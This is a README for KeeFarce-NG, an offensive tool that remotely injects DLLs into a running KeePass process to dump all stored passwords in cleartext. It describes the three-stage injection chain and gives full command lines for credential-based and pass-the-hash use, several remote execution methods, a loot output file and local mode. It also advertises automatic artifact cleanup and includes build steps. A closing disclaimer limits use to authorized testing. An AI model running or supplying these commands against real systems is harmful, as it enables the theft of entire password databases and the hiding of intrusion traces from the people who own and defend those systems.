# KeeFarce-NG

Universal KeePass 2.x plaintext password extraction tool. Remotely injects into a running KeePass process and dumps all database entries in cleartext.

## How It Works

Three-stage DLL injection via SMB:
1. **Inj.dll** — Opens the target KeePass process and injects the loader
2. **ldr.dll** — Native loader that bootstraps the .NET runtime inside KeePass
3. **KPX.dll** — .NET assembly that reflects into KeePass internals, walks the document model, and extracts all entries (titles, usernames, passwords, URLs, notes)

## Features

- **Zero dependencies** — standalone Python script or single Windows EXE
- **Pure Python SMB/DCERPC/NTLM** — no impacket, no external libraries
- **4 execution methods** — Task Scheduler (TSCH), Service Control (SVCCTL), WMI, WinRM
- **SMB1/2/3 support** — auto-negotiation or forced dialect
- **Pass-the-Hash** — authenticate with NTLM hash instead of password
- **Auto-cleanup** — removes all artifacts from target after extraction

## Usage

```
# Help
keefarce.exe -h                                         # Windows
./keefarce -h                                           # Linux
python3 keefarce.py -h                                  # Python

# Basic
keefarce.exe <target> <domain>/<user>:<password>        # Windows
./keefarce <target> <domain>/<user>:<password>           # Linux
python3 keefarce.py <target> <domain>/<user>:<password>  # Python

# Save output to file
keefarce <target> <domain>/<user>:<password> -o loot.txt

# Local account
keefarce <target> ./<user>:<password>

# Pass-the-hash
keefarce <target> <domain>/<user> --hashes :NTHASH

# Different exec methods
keefarce <target> <domain>/<user>:<password> --exec-method svcctl
keefarce <target> <domain>/<user>:<password> --exec-method wmi
keefarce <target> <domain>/<user>:<password> --exec-method winrm

# Force SMB dialect
keefarce <target> <domain>/<user>:<password> --smb 1
keefarce <target> <domain>/<user>:<password> --smb 3

# Local mode (run directly on the target machine)
keefarce --local
```

## Build

### Windows EXE
```
pip install pyinstaller
pyinstaller --onefile --clean keefarce.py
```

### Linux Binary
```
pip install pyinstaller
pyinstaller keefarce.spec --noconfirm
```

Output binary will be in the `dist/` folder.

## Disclaimer

This tool is intended for authorized penetration testing and security research only. Unauthorized access to computer systems is illegal. Use responsibly.
